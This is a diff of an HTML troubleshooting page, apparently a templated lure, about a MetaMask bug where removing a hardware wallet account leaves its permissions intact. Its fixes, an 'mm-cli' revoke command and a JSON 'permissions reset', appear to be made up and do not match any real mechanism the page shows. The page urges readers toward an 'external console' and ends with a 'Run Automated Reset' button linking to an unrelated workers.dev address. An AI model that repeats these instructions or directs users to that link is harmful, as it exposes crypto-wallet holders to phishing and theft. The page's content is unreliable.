@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Permissions Removing Hardware Wallet Acc – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: -apple-system;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,34 @@
 <h1>Metamask Extension Bug Permissions Removing Hardware Wallet Acc</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, leading to unexpected behavior and potential security vulnerabilities.</li>
+<li>Users experience an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the permissions tied to a hardware wallet account are not properly revoked when the account is removed.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the removal of a hardware wallet account does not properly revoke the previously granted permissions, leaving them intact and potentially vulnerable to unauthorized access.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Delete the local storage data associated with the Metamask extension</li>
-<li>Reset the Metamask extension to its default settings</li>
-<li>Execute the following command to revoke permissions:</li>
+<li>Attempt to manually revoke permissions by accessing the account settings and explicitly removing the hardware wallet account.</li>
+<li>Utilize the Metamask API to programmatically remove the account and associated permissions.</li>
+<li>Use the following JSON configuration to reset the permissions:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-cli<span class="w"> </span>--revoke-permissions<span class="w"> </span>--account<span class="o">=</span>&lt;hardware-wallet-account-address&gt;
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;accounts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...hardware-wallet-address...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for enhanced debugging capabilities.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and configured</li>
-<li>Hardware wallet account connected to Metamask</li>
-<li>Basic understanding of command-line interfaces and wallet management</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and configured
+* Hardware wallet account connected to Metamask
+* Basic understanding of JSON configuration files
+For further troubleshooting, consider using an external console to execute commands and verify the results.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
